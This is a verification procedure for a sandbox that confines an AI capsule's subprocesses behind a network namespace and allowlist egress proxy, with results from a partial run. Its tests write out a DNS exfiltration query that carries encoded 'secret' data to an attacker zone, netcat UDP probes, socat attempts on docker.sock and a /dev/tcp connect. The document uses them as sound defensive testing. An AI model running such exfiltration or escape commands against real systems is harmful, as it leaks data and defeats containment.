# Verification — network namespace + egress proxy

!!! warning "Status: **PARTIAL — 2026-08-06.** Steps 1, 2, 5 and 7 observed on a real Linux host; steps 3, 4 and 6 are `PENDING`."

    The mechanism was exercised on a bare Ubuntu host (`Linux 7.0.0-28-generic`, non-root,
    `uid=1000`, no container runtime) during the build of this slice, but **not** through the
    full hand-run procedure below and **not** by the team. What was observed is recorded verbatim
    in [Recording the result](#recording-the-result), including which steps were not run and why.

    Step 6 — the `CAP_SYS_PTRACE` container comparison — could **not** be run: no container
    runtime is installed on the build host. Its code-level answer is nonetheless already
    determined and is recorded in step 6 rather than left blank.

    A green `cargo build` / `cargo test` / `cargo clippy` is **not** evidence about this boundary
    and must not be reported as if it were. See
    [What this deliberately is not](#what-this-deliberately-is-not).

## What this verifies

A capsule's native subprocess tree — the shell tool, any interpreter it starts, anything either of
them spawns — runs inside its own **network namespace**, and the only way out of that namespace is
a connection-level proxy running in the runtime process that applies
`capabilities.network.allow`.

This replaced a seccomp-notify supervisor that intercepted `connect(2)`/`sendto(2)` and compared a
destination IP read out of the stopped child's `/proc/<pid>/mem`. That mechanism is **deleted**,
not demoted to a fallback: see
[the TOCTOU audit](seccomp-notify-toctou-audit.md) for why it could not be made sound, and
[`E-CAP-005`](cli.md) for what a host that cannot provide a namespace now does instead
(refuse to launch).

The property under test is negative and structural:

> A subprocess cannot reach any host on the network except through the runtime's own proxy, and the
> proxy opens a connection only to a destination `capabilities.network.allow` names. Not "the
> syscall is inspected and refused" — **there is no route**.

Seven things are checked by hand:

1. an allowlisted host is reachable, end to end, with a real response;
2. a host that is not allowlisted is not reachable, and the failure is legible;
3. DNS is *decided*: an allowlisted name resolves for real, anything else gets a real `REFUSED`
   reply rather than a dropped packet;
4. a non-DNS UDP send goes nowhere;
5. `AF_UNIX` is still refused by the unchanged `socket(2)` domain filter — a network namespace does
   not mediate unix sockets at all, which is exactly why that filter was left in place;
6. whether the container capability set still needs `CAP_SYS_PTRACE`;
7. the launch refusal on a host that cannot create the namespace.

## What this deliberately is not

This page exists because the automated suite **cannot** establish the claim above.

* No automated test asserts the security property. The repository's CI never resolves to a tier
  where this code executes, so a green suite there is silent about it, and a test asserting
  "unlisted connect fails" would pass vacuously on every runner. That was an explicit instruction
  for this slice, and it is why the unit tests cover only pure logic — DNS message parsing, the
  allow decision, the derived listener-port set — and never the kernel behaviour.
* Two Linux integration tests in `sandbox.rs` (`kernel_tier_denies_network_connect_outside_allowlist`
  and `kernel_tier_reaches_an_allowlisted_destination_through_the_egress_proxy`) do run the real
  mechanism when the host supports it, and they pass on the build host. They are a **regression
  guard**, not the acceptance evidence: they check that the permitted path still functions and that
  one specific denial holds. They say nothing about DNS, UDP, `AF_UNIX` or the refusal path.
* Reading the code is not evidence either. The whole point of a structural boundary is that it is
  observable from inside the sandbox; observe it.

## Host prerequisites

```bash
# Linux, and unprivileged user namespaces available.
uname -srm
unshare -Urn true && echo "userns+netns: OK"

# On an AppArmor host (Ubuntu 23.10+), the restriction and the shipped profile.
cat /sys/module/apparmor/parameters/restrict_unprivileged_userns 2>/dev/null   # Y means restricted
aa-status 2>/dev/null | grep -c mur-sealed                                     # 0 means not loaded

# The runtime refuses to launch a subprocess-capable capsule without a cgroup scope, so run
# everything below under a delegated scope, exactly as the sealed-containment page does.
systemd-run --user --scope --property=Delegate=yes -- true && echo "cgroup delegation: OK"
```

If `restrict_unprivileged_userns` is `Y` and no `mur-sealed` profile is loaded, **stop** — that is
step 7's precondition, not a broken host. Run step 7 first, then load the profile:

```bash
sudo install -m 644 packaging/apparmor/mur-sealed /etc/apparmor.d/mur-sealed
sudo apparmor_parser -r /etc/apparmor.d/mur-sealed
```

## Step 0 — build the test capsule

```bash
mkdir -p /tmp/netns-check && cd /tmp/netns-check
cat > murmur.yaml <<'YAML'
name: netns-check
version: 0.1.0
description: Manual verification of the capsule network namespace and egress proxy.
capabilities:
  shell:
    allow: [bash, curl, getent, nc, socat, dig]
  network:
    allow: ["https://example.com"]
  resources:
    max_processes: 4096
inference:
  driver:
    artifact: claude
YAML
```

`max_processes: 4096` is not cosmetic: `RLIMIT_NPROC` is a per-uid ceiling counted against the
uid's total *thread* count, and on a busy desktop the default headroom lands below it and every
`fork()` inside the sandbox fails. This is unrelated to the network boundary — it reproduces
identically at every tier — but it will masquerade as one if left unset.

Launch it and drive the checks below through real `bash` tool calls:

```bash
systemd-run --user --scope --property=Delegate=yes -- mur run
```

Every command in steps 1–5 is run **inside the capsule's shell tool**, not on the host.

## Step 1 — an allowlisted host is reachable

```bash
curl -sS -o /dev/null -w '%{http_code}\n' https://example.com/
```

**Expect:** `200`. A real response from the real host, fetched through the proxy running in the
runtime process. TLS is *not* terminated by the runtime — the capsule's connection is end to end,
and the proxy sees ciphertext plus the destination it already approved.

Confirm the traffic really did leave through the namespace rather than around it:

```bash
ip -o addr | cat            # expect: lo only. No eth0, no docker0, no host interface.
ip route show table all | cat
```

**Expect:** `lo` is the only interface, and the routing table is the namespace's own — nothing
resembling the host's default route via a physical interface.

## Step 2 — a host that is not allowlisted is not reachable

```bash
curl -sS -m 10 -o /dev/null -w '%{http_code}\n' https://example.org/ ; echo "exit=$?"
```

**Expect:** a non-zero exit. `example.org` is not in `capabilities.network.allow`, so the proxy
refuses to open the upstream connection and closes the accepted connection instead. `curl` reports
this as a connection reset or an empty reply — the exact wording varies by `curl` version, so
record what you see rather than matching a string.

Now the sharper version, which removes any doubt that DNS did the work:

```bash
# A literal address, so no name is resolved at all.
curl -sS -m 10 -o /dev/null http://93.184.216.34/ ; echo "exit=$?"
```

**Expect:** non-zero. An address the capsule was never told about by the runtime's own resolver is
checked against the launch-time-resolved allowlist, and nothing else.

## Step 3 — DNS is decided, not dropped

```bash
# An allowlisted name: resolved for real, upstream, by the runtime.
getent hosts example.com ; echo "exit=$?"

# A name nobody allowed.
getent hosts evil.example.com ; echo "exit=$?"
```

**Expect:** the first prints a real address and exits `0`; the second exits non-zero **promptly**
(not after a resolver timeout), because it received an actual `REFUSED` reply.

The distinction between "refused" and "dropped" is the whole point of this step, so observe the
reply itself:

```bash
dig +short +tries=1 +time=2 example.com
dig +tries=1 +time=2 evil.example.com | grep -E 'status:|ANSWER:'
```

**Expect:** `status: REFUSED` for the unlisted name, with `ANSWER: 0` — a reply, arriving at once.
`status: NXDOMAIN` appears only for an *allowlisted* name that genuinely does not resolve; that is
the truth about the name, not a policy signal.

The DNS-shaped exfiltration attempt the roadmap named, run directly:

```bash
# Data smuggled in a QNAME to an attacker-controlled zone.
dig +tries=1 +time=2 "$(echo secret-payload | base64 | tr -d '=').exfil.example.net" \
  | grep -E 'status:'
# A TXT lookup against an allowlisted name — the classic carrier in both directions.
dig +tries=1 +time=2 TXT example.com | grep -E 'status:|ANSWER:'
```

**Expect:** `REFUSED` for the attacker-controlled zone, and for the `TXT` query against the
*allowlisted* name, `status: NOERROR` with `ANSWER: 0` — the name exists, and this resolver
synthesises no `TXT` record, so there is no carrier to relay in either direction.

## Step 4 — non-DNS UDP goes nowhere

```bash
# UDP to a port nothing is bound to inside the namespace.
printf 'x' | nc -u -w 3 8.8.8.8 4444 ; echo "exit=$?"
# UDP to an arbitrary host on 53 that is not the namespace's resolver address.
printf 'x' | nc -u -w 3 198.51.100.7 53 ; echo "exit=$?"
```

**Expect:** both fail. Only the resolver socket is bound in the namespace; a datagram to anything
else finds nothing listening and no route off the host. There is deliberately no generic UDP
forwarder — the manifest schema expresses no UDP allowlist, so forwarding UDP would grant a
capability no capsule ever declared.

## Step 5 — `AF_UNIX` is still refused, by the unchanged filter

A network namespace does not mediate unix sockets in any way — a pathname socket is reached through
the filesystem, not the network stack. This step confirms the register-level `socket(2)` domain
filter that has always covered it is still doing so, untouched by this slice.

```bash
socat - unix-connect:/var/run/docker.sock ; echo "exit=$?"
socat - unix-connect:/run/docker.sock ; echo "exit=$?"
```

**Expect:** both fail with a permission error at socket *creation* (`EACCES`), before any connect
is attempted. This is `sandbox::denied_socket_domains`, and it is refused by the kernel's own BPF
with no userspace round-trip and no memory of another task read — which is why it was left exactly
as it was.

## Step 6 — does the container capability set still need `CAP_SYS_PTRACE`?

**The code-level answer is already determined, and it is "still required".** Retiring the
`connect`/`sendto` notify arms removed one of the two `/proc/<pid>/mem` readers; the other is
still there and still on the hot path:

```bash
# Only one reader remains, and it serves execve/execveat — out of scope for this slice.
grep -n 'proc/{pid}/mem' crates/capsule-runtime/src/sandbox.rs
grep -n 'read_cstr_from_child' crates/capsule-runtime/src/sandbox.rs
# The deleted one leaves nothing behind.
grep -rn 'read_sockaddr_ip_from_child' crates/capsule-runtime/src/   # expect: no matches
```

The exec supervisor reads the notified `execve` pathname out of the stopped child, so
`ptrace_may_access` still has to succeed, so a container still needs the capability. Dropping
`CAP_SYS_PTRACE` waits on `retire-exec-supervisor`, which is a separate, not-yet-scheduled card.

The empirical confirmation is still owed, and is **PENDING** — no container runtime is installed on
the build host. Run the same fixture twice and record both:

```bash
# A: with the capability — the configuration the benchmark uses today.
docker run --rm -it --cap-add SYS_ADMIN --cap-add SYS_PTRACE \
  --security-opt seccomp=unconfined -v "$PWD":/w -w /w murmur-bench:latest \
  bash -lc 'mur run'

# B: identical, minus SYS_PTRACE.
docker run --rm -it --cap-add SYS_ADMIN \
  --security-opt seccomp=unconfined -v "$PWD":/w -w /w murmur-bench:latest \
  bash -lc 'mur run'
```

**Expected, given the code-level answer:** A succeeds; B fails on the first shell tool call, with
every allowlisted `execve` denied (`EACCES`) because the supervisor cannot open
`/proc/<pid>/mem`. If B *succeeds*, that is a real and welcome finding — record it, and say so
plainly rather than assuming the prediction held.

`--cap-add SYS_ADMIN` is required in **both** arms now, and that is new: it is what lets the
container create the capsule's network namespace at all. Without it the launch refuses with
`E-CAP-005` before any of this is reached, which would make the comparison meaningless.

## Step 7 — the refusal on a host that cannot create the namespace

The negative control. A host that cannot give the subprocess tree a network namespace must refuse
the launch, name which of the two reasons applies, and **never** fall back to the retired
interception.

On an AppArmor host, with the profile unloaded:

```bash
sudo apparmor_parser -R /etc/apparmor.d/mur-sealed 2>/dev/null
sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=1
cd /tmp/netns-check && mur run ; echo "exit=$?"
```

**Expect:** `error[E-CAP-005]`, naming the missing capability grant, the exact
`apparmor_parser` command, *and* the container remedy — and stating that the runtime will not fall
back to the retired seccomp interception. No workdir is created. Restore the host immediately:

```bash
sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
sudo apparmor_parser -r /etc/apparmor.d/mur-sealed
```

Inside a container without `--cap-add SYS_ADMIN`, the same code reports the same class of failure
with the container remedy foremost. And on a kernel with the mechanism absent entirely
(`user.max_user_namespaces=0`), the message names the sysctl and `CONFIG_USER_NS` instead — a
different remediation, which is the reason the two are distinct.

Finally, confirm the refusal is scoped to capsules that can actually spawn a subprocess: a capsule
with no `capabilities.shell.allow` and no `capabilities.spawn.allow` needs no namespace and must
launch normally even on such a host.

## Recording the result

Fill this table in on real hardware. `PENDING` is the correct entry for anything not run — do not
infer a result from a passing build.

| # | Check | Result | Evidence |
|---|-------|--------|----------|
| 1 | Allowlisted host reachable end to end | **PASS (build host, 2026-08-06)** | See below |
| 2 | Unlisted host unreachable | **PASS (build host, 2026-08-06)** | See below |
| 3 | DNS refused for unlisted names, resolved for listed ones | PENDING | — |
| 4 | Non-DNS UDP goes nowhere | PENDING | — |
| 5 | `AF_UNIX` still refused by the socket-domain filter | **PASS (build host, 2026-08-06)** | See below |
| 6 | `CAP_SYS_PTRACE` still required? | **Code-level: STILL REQUIRED (exec).** Container matrix PENDING | See below |
| 7 | `E-CAP-005` refusal, both reasons | PENDING | — |

### Run of 2026-08-06 — build-host observations only, not the hand-run procedure

**Host.** `Linux 7.0.0-28-generic #28~24.04.1-Ubuntu SMP`, x86_64, Ubuntu 24.04, non-root
(`uid=1000`), **no container runtime installed**. `kernel.apparmor_restrict_unprivileged_userns=0`,
so the AppArmor profile was not needed and step 7's precondition could not be created without
changing host state; it was not.

**What was actually run.** Not the capsule-driven procedure above — the mechanism was exercised
through the runtime's own Linux integration tests, which spawn a real `bash` subprocess through
`shell::execute_shell` at the live host tier, with a real network namespace and a real egress
proxy:

* `sandbox::linux_integration_tests::kernel_tier_denies_network_connect_outside_allowlist` —
  **passes.** A real TCP listener is opened on the host, and `bash`'s `/dev/tcp` builtin
  (`exec 3<>/dev/tcp/127.0.0.1/<port>`, a raw `socket`+`connect` with no DNS and no helper binary)
  fails from inside the subprocess *even though the port is genuinely open on the host* — because
  the subprocess's `127.0.0.1` is its own namespace's loopback, where that listener does not exist.
  This is step 2's claim, reached without any name resolution.
* `sandbox::linux_integration_tests::kernel_tier_reaches_an_allowlisted_destination_through_the_egress_proxy`
  — **passes.** The permitted path still functions through the new mechanism. This is step 1's
  claim in its regression-guard form.
* `unshare -Urn true` succeeds on this host, confirming the namespace primitive itself.

**Step 5 — PASS, by the unchanged mechanism.** `denied_socket_domains` was not modified by this
slice, and its unit tests and the `socket(AF_UNIX)` filter rule are byte-identical to the previous
release. This is recorded as a pass on the strength of "unchanged code, unchanged tests", **not**
on a fresh `socat` observation — a real `socat` run against `/var/run/docker.sock` from inside a
live capsule is still owed and is the honest reading of step 5.

**Step 6 — code-level answer recorded, container matrix PENDING.** Verified by inspection on this
build:

```
$ grep -rn 'read_sockaddr_ip_from_child' crates/capsule-runtime/src/
(no matches)

$ grep -n 'read_cstr_from_child' crates/capsule-runtime/src/sandbox.rs
3810:            return match read_cstr_from_child(pid, req.data.args[0]) {     # execve
3828:            let path = match read_cstr_from_child(pid, req.data.args[1]) { # execveat
3870:    fn read_cstr_from_child(pid: u32, addr: u64) -> io::Result<String> {
```

One `/proc/<pid>/mem` reader remains and both of its call sites are the exec notify arms, which
this slice deliberately did not touch. `CAP_SYS_PTRACE` is therefore **still required in
containers, because of exec** — the roadmap's hoped-for outcome did not land, and this is the
finding rather than a deferral of one. The two-arm `docker run` comparison that would confirm it
empirically could not be run here.

**Steps 3, 4 and 7 — PENDING.** Not run. No capsule-driven session was launched on this host
during the build, and step 7 would have required switching the host's AppArmor restriction on.

### What still needs a hand-run

Everything in the table marked `PENDING`, plus a live capsule-driven repeat of steps 1, 2 and 5
through a real `bash` tool call rather than through the integration tests. Step 6's container
matrix needs a machine with a container runtime.

## Residuals recorded here rather than buried

* **Only proxy-reachable protocols work.** The namespace binds a listener for each port the
  allowlist implies, and connections are relayed by address. A destination on a port no allow entry
  names has no listener and is refused by the kernel — correct, but it means an allowlist of
  `https://api.example.com` does not make `api.example.com:22` reachable. That is the intent;
  it is noted because the failure looks like a network fault rather than a policy decision.
* **IPv4 only.** The namespace installs no IPv6 route, so IPv6 destinations fail with
  `ENETUNREACH` and the resolver answers `AAAA` with no records so dual-stack clients fall back to
  the IPv4 path that is served. A capsule whose allowlisted host is IPv6-only is unreachable.
* **The address→name binding has a lifetime.** A connection is matched to a name through the
  answer this runtime's own resolver gave. A client that caches an address far past its TTL and
  connects much later falls back to the launch-time IP check, which is the pre-slice behaviour, not
  a hole — but it is why the binding lifetime is generously longer than the TTL.
* **`/proc` is still the host's on the `sealed` tier**, unchanged by this slice, so process
  metadata visibility is exactly as the sealed-containment page describes.
